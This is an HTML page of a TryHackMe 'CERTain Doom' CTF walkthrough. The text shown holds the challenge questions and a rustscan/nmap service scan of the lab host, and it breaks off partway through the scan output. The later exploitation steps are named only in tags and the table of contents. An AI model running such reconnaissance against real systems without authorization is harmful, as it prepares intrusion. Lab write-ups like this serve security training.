<!doctype html><html lang=en dir=ltr><head><title>CERTain Doom | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Introduction Detailed walkthroughs for CERTain Doom CTF challenges on TryHackMe .
$ echo &amp;#34;10.10.81.254 certain-doom.thm&amp;#34; &amp;gt;&amp;gt; /etc/hosts Mappped the ip to domain certain-doom.thm.
Questions 1. What is the web flag? Hint:Today&amp;#39;s lucky number is 11 2. What is the user&amp;#39;s flag? 3. What is the super secret flag? Hint: supersonic subatomic Initial Foothold Rustscan $ rustscan -a certain-doom.thm -- -sV -sC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| | | ."><meta name=keywords content="cyber security,penetration testing,ethical hacking,vulnerability assessment,network security,application security,web application security,security testing,red teaming,bug bounty,CTFs,cybersecurity challenges,hacking tutorials,security tools,exploit development,reverse engineering,penetration tester,security researcher,security analyst,information security,digital forensics,incident response,threat intelligence,security awareness,social engineering,phishing,malware analysis,cryptography,cloud security,IoT security,mobile security,how to become a penetration tester,penetration testing tools,CTF challenges for beginners,web application penetration testing,network penetration testing,exploit development tutorial,reverse engineering techniques,bug bounty hunting tips,security research projects,cyber security certifications"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://cyberjagadeesh.github.io/posts/certaindoom/writeup/"><meta property="og:site_name" content="CyberJagadeesh"><meta property="og:title" content="CERTain Doom | THM Writeup"><meta property="og:description" content="Introduction Detailed walkthroughs for CERTain Doom CTF challenges on TryHackMe .
$ echo &#34;10.10.81.254 certain-doom.thm&#34; >> /etc/hosts Mappped the ip to domain certain-doom.thm.
Questions 1. What is the web flag? Hint:Today's lucky number is 11 2. What is the user's flag? 3. What is the super secret flag? Hint: supersonic subatomic Initial Foothold Rustscan $ rustscan -a certain-doom.thm -- -sV -sC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| | | ."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-23T23:22:49+05:30"><meta property="article:modified_time" content="2024-09-23T23:22:49+05:30"><meta property="article:tag" content="Deserialization-Vulnerability"><meta property="article:tag" content="CVE-2020-9484"><meta property="article:tag" content="Static-Nmap"><meta property="article:tag" content="Ligolo-Ng"><meta property="article:tag" content="Tunneling"><meta property="article:tag" content="CVE-2022-21449"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/cheesectf/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/breakme/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/chrome/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/u.a.highschool/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/airplane/writeup/"><meta name=twitter:card content="summary"><meta name=twitter:title content="CERTain Doom | THM Writeup"><meta name=twitter:description content="Introduction Detailed walkthroughs for CERTain Doom CTF challenges on TryHackMe .
$ echo &#34;10.10.81.254 certain-doom.thm&#34; >> /etc/hosts Mappped the ip to domain certain-doom.thm.
Questions 1. What is the web flag? Hint:Today's lucky number is 11 2. What is the user's flag? 3. What is the super secret flag? Hint: supersonic subatomic Initial Foothold Rustscan $ rustscan -a certain-doom.thm -- -sV -sC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| | | ."><link rel=canonical href=https://cyberjagadeesh.github.io/posts/certaindoom/writeup/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-376DY6PW0W")}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2024-09-23T23:22:49+05:30","datePublished":"2024-09-23T23:22:49+05:30","description":"Introduction Detailed walkthroughs for CERTain Doom CTF challenges on TryHackMe .\n$ echo \u0026#34;10.10.81.254 certain-doom.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Mappped the ip to domain certain-doom.thm.\nQuestions 1. What is the web flag? Hint:Today\u0026#39;s lucky number is 11 2. What is the user\u0026#39;s flag? 3. What is the super secret flag? Hint: supersonic subatomic Initial Foothold Rustscan $ rustscan -a certain-doom.thm -- -sV -sC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .","image":"/posts/certaindoom/certaindoom.png","name":"CERTain Doom | THM Writeup","url":"https://cyberjagadeesh.github.io/posts/certaindoom/writeup/"}</script></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
<span class=sr-only>Open main menu</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Post>Post</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/certaindoom/writeup/><figure><img class="w-full object-cover h-36 md:h-48 xl:h-60" src=/posts/certaindoom/certaindoom.png alt="CERTain Doom | THM Writeup" title="CERTain Doom | THM Writeup" loading=lazy></figure></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/certaindoom/writeup/>CERTain Doom | THM Writeup</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/categories/ctf/ class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">CTF</a></li><li><a href=/tags/deserialization-vulnerability/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Deserialization-Vulnerability</span></a></li><li><a href=/tags/cve-2020-9484/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>CVE-2020-9484</span></a></li><li><a href=/tags/static-nmap/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Static-Nmap</span></a></li><li><a href=/tags/ligolo-ng/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Ligolo-Ng</span></a></li><li><a href=/tags/tunneling/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Tunneling</span></a></li><li><a href=/tags/cve-2022-21449/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>CVE-2022-21449</span></a></li><li><a href=/tags/jwt/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>JWT</span></a></li><li><a href=/tags/java/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Java</span></a></li><li><a href=/tags/psychic-signatures/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Psychic Signatures</span></a></li><li><a href=/tags/ffuf/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Ffuf</span></a></li><li><a href=/tags/curl/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Curl</span></a></li><li><a href=/series/tryhackme/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Tryhackme</span></a></li><li><a href=/platforms/linux/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Linux</span></a></li><li><a href=/levels/hard/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Hard</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
</i><time datetime=2024-09-23T23:22:49+05:30>2024-09-23</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
</i><span>15 minutes to read</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#questions>Questions</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#rustscan>Rustscan</a></li><li><a href=#path-discovery-by-fuzzing>Path Discovery by fuzzing</a></li><li><a href=#8080reports>8080:reports/</a></li><li><a href=#cve-2020-9484>CVE-2020-9484</a></li></ul></li><li><a href=#penetrating-internal-network>Penetrating Internal Network</a><ul><li><a href=#better-shell>Better shell</a></li><li><a href=#etchosts>/etc/hosts</a></li><li><a href=#nmap>nmap</a></li><li><a href=#ligolo-ng-tunneling>ligolo-ng tunneling</a></li><li><a href=#library>library</a></li></ul></li><li><a href=#final-flag>Final Flag</a><ul><li><a href=#cve-2022-21449>CVE-2022-21449</a></li></ul></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h2 id=introduction>Introduction</h2><p>Detailed walkthroughs for <a href=https://tryhackme.com/r/room/certaindoom target=_blank rel=noopener>CERTain Doom</a>
CTF challenges on <a href=https://tryhackme.com target=_blank rel=noopener>TryHackMe</a>
.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;10.10.81.254 certain-doom.thm&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Mappped the ip to domain <code>certain-doom.thm</code>.</p><h2 id=questions>Questions</h2><pre tabindex=0><code>1. What is the web flag? Hint:Today&#39;s lucky number is 11 
2. What is the user&#39;s flag?
3. What is the super secret flag? Hint: supersonic subatomic
</code></pre><h2 id=initial-foothold>Initial Foothold</h2><h3 id=rustscan>Rustscan</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rustscan -a certain-doom.thm -- -sV -sC      
</span></span><span class=line><span class=cl>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=o>{}</span>  <span class=o>}</span><span class=p>|</span> <span class=o>{</span> <span class=o>}</span> <span class=p>|</span><span class=o>{</span> <span class=o>{</span>__ <span class=o>{</span>_   _<span class=o>}{</span> <span class=o>{</span>__  /  ___<span class=o>}</span> / <span class=o>{}</span> <span class=se>\ </span><span class=p>|</span>  <span class=sb>`</span><span class=p>|</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> .-. <span class=se>\|</span> <span class=o>{</span>_<span class=o>}</span> <span class=p>|</span>.-._<span class=o>}</span> <span class=o>}</span> <span class=p>|</span> <span class=p>|</span>  .-._<span class=o>}</span> <span class=o>}</span><span class=se>\ </span>    <span class=o>}</span>/  /<span class=se>\ </span> <span class=se>\|</span> <span class=p>|</span><span class=se>\ </span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=sb>`</span>-<span class=s1>&#39; `-&#39;</span><span class=sb>`</span>-----<span class=s1>&#39;`----&#39;</span>  <span class=sb>`</span>-<span class=s1>&#39;  `----&#39;</span>  <span class=sb>`</span>---<span class=s1>&#39; `-&#39;</span>  <span class=sb>`</span>-<span class=s1>&#39;`-&#39;</span> <span class=sb>`</span>-<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>The Modern Day Port Scanner.
</span></span></span><span class=line><span class=cl><span class=s1>________________________________________
</span></span></span><span class=line><span class=cl><span class=s1>: http://discord.skerritt.blog         :
</span></span></span><span class=line><span class=cl><span class=s1>: https://github.com/RustScan/RustScan :
</span></span></span><span class=line><span class=cl><span class=s1> --------------------------------------
</span></span></span><span class=line><span class=cl><span class=s1>[~] The config file is expected to be at &#34;/root/.rustscan.toml&#34;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>Open 10.10.81.254:22
</span></span></span><span class=line><span class=cl><span class=s1>Open 10.10.81.254:80
</span></span></span><span class=line><span class=cl><span class=s1>Open 10.10.81.254:8080
</span></span></span><span class=line><span class=cl><span class=s1>[~] Starting Script(s)
</span></span></span><span class=line><span class=cl><span class=s1>Scanned at 2024-09-14 08:29:53 IST for 157s
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>PORT     STATE SERVICE    REASON         VERSION
</span></span></span><span class=line><span class=cl><span class=s1>22/tcp   open  ssh        syn-ack ttl 60 OpenSSH 8.0 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=s1>| ssh-hostkey: 
</span></span></span><span class=line><span class=cl><span class=s1>|   3072 f0:69:84:5c:69:01:42:2d:da:01:3e:13:a6:db:2f:c3 (RSA)
</span></span></span><span class=line><span class=cl><span class=s1>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDI9RmMphpZ0uukrNxPj8ojeRdQF3nTPgufa6bqShoWI9Sfs78koCvg+oYL2dz+o+JU34j7kbNnzqrlkvG2piLgjGa/nzZbUVpiAk85TGSrltb2H9p6ORqTXmgnFNitwynoz8tI0XqIBxuQm801hEYBOYFdEqRp8pPLkbDI8gDUJCtk8Ta+v189AXvIBragn4jPcXS7wbX61csUr7jGjneln9hybY4GC/cmHMIF2sYCzHbDuwl7bC4QVf8Qd1DNknR0f7pPGillIa76d4c+10pF83kv4QjZf3WRdytNo6psqg9VH2Kz6AWpPn9z6aWTanONQzl3HdP8mzBzsUA76ZPh/IgNQDrCJTmM9SX4z2n60+aqlPo6PjvM8XxSu/XvPsvzpL+CABmz+k2ziCmd+nQ0tJrpIwUFTpb/82ZbGSDtFNNm35vsL++R5yHodU0jvb0Yq8blpUu4vh7Pzuiryk2H7HgjYcj1FmPwGvv+HpdY+uPQwuIA9xe2bnxZ8BW7LKE=
</span></span></span><span class=line><span class=cl><span class=s1>|   256 cc:55:d5:72:1d:be:03:85:d5:7e:3e:1a:d6:72:2c:2c (ECDSA)
</span></span></span><span class=line><span class=cl><span class=s1>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLig4AYdXAxFRwdUHHUtXGkdr3GFGGM83WssnCjyrU1deeFT1BDuit5NI+7nEqVl0BeSSU3LRpHeLpSIYiugxC0=
</span></span></span><span class=line><span class=cl><span class=s1>|   256 08:34:3b:e0:5d:d1:37:d4:68:28:6b:cf:e2:f1:53:ed (ED25519)
</span></span></span><span class=line><span class=cl><span class=s1>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINFfDent94JxaXvMValeP9zIhJO8/mj/WFtHqGkUsv4X
</span></span></span><span class=line><span class=cl><span class=s1>80/tcp   open  http       syn-ack ttl 59 hastatic-1.0.0
</span></span></span><span class=line><span class=cl><span class=s1>|_http-server-header: hastatic-1.0.0
</span></span></span><span class=line><span class=cl><span class=s1>| fingerprint-strings: 
</span></span></span><span class=line><span class=cl><span class=s1>|   GetRequest, HTTPOptions: 
</span></span></span><span class=line><span class=cl><span class=s1>|     HTTP/1.0 200 OK
</span></span></span><span class=line><span class=cl><span class=s1>|     Content-Length: 117674
</span></span></span><span class=line><span class=cl><span class=s1>|     Accept-Ranges: bytes
</span></span></span><span class=line><span class=cl><span class=s1>|     Date: Sat, 14 Sep 2024 03:00:00 GMT
</span></span></span><span class=line><span class=cl><span class=s1>|     Server: hastatic-1.0.0
</span></span></span><span class=line><span class=cl><span class=s1>|     Content-Type: text/html
</span></span></span><span class=line><span class=cl><span class=s1>|     Cache-Control: no-transform,public,max-age=300,s-maxage=900
</span></span></span><span class=line><span class=cl><span class=s1>|     Last-Modified: Thu, 26-Jan-2023 22:44:29 UTC
</span></span></span><span class=line><span class=cl><span class=s1>|     ETag: 98eb1c6fb079742e0b8682cb642c5c777329ebbe
</span></span></span><span class=line><span class=cl><span class=s1>|     Vary: Accept-Encoding
</span></span></span><span class=line><span class=cl><span class=s1>|     Referrer-Policy: strict-origin-when-cross-origin
</span></span></span><span class=line><span class=cl><span class=s1>|     X-Frame-Options: SAMEORIGIN
</span></span></span><span class=line><span class=cl><span class=s1>|     X-XSS-Protection: 1; mode=block
</span></span></span><span class=line><span class=cl><span class=s1>|     &lt;!doctype html&gt;
</span></span></span><span class=line><span class=cl><span class=s1>|     &lt;html class=&#34;no-js&#34; lang=&#34;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s1>|     &lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=s1>|     &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s1>|     &lt;title&gt;Super Secret Admin Page&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=s1>|     &lt;meta name=&#34;description&#34; content=&#34;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s1>|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s1>|     &lt;meta property=&#34;og:title&#34; content=&#34;Hydra&#39;</span>s Super Secret Admin Page<span class=s2>&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>|     &lt;meta property=&#34;</span>og:type<span class=s2>&#34; content=&#34;</span>website<span class=s2>&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>|     &lt;meta property=&#34;</span>og:url<span class=s2>&#34; content=&#34;</span>https://admin.certain-doom.thm<span class=s2>&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>|_    &lt;meta property=&#34;</span>og:image<span class=s2>&#34; content=&#34;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>| http-methods: 
</span></span></span><span class=line><span class=cl><span class=s2>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span></span><span class=line><span class=cl><span class=s2>|_http-title: Super Secret Admin Page
</span></span></span><span class=line><span class=cl><span class=s2>|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
</span></span></span><span class=line><span class=cl><span class=s2>8080/tcp open  http-proxy syn-ack ttl 59 Apache Tomcat 9?
</span></span></span><span class=line><span class=cl><span class=s2>|_http-title: HTTP Status 404 \xE2\x80\x93 Not Found
</span></span></span><span class=line><span class=cl><span class=s2>|_http-server-header: Apache Tomcat 9?
</span></span></span><span class=line><span class=cl><span class=s2>| fingerprint-strings: 
</span></span></span><span class=line><span class=cl><span class=s2>|   GetRequest, HTTPOptions: 
</span></span></span><span class=line><span class=cl><span class=s2>|     HTTP/1.1 404 
</span></span></span><span class=line><span class=cl><span class=s2>|     Content-Type: text/html;charset=utf-8
</span></span></span><span class=line><span class=cl><span class=s2>|     Content-Language: en
</span></span></span><span class=line><span class=cl><span class=s2>|     Content-Length: 431
</span></span></span><span class=line><span class=cl><span class=s2>|     Date: Sat, 14 Sep 2024 03:00:00 GMT
</span></span></span><span class=line><span class=cl><span class=s2>|     Connection: close
</span></span></span><span class=line><span class=cl><span class=s2>|     Server: Apache Tomcat 9?
</span></span></span><span class=line><span class=cl><span class=s2>|     &lt;!doctype html&gt;&lt;html lang=&#34;</span>en<span class=s2>&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 
</span></span></span><span class=line><span class=cl><span class=s2>|     Found&lt;/title&gt;&lt;style type=&#34;</span>text/css<span class=s2>&#34;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 
</span></span></span><span class=line><span class=cl><span class=s2>|     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
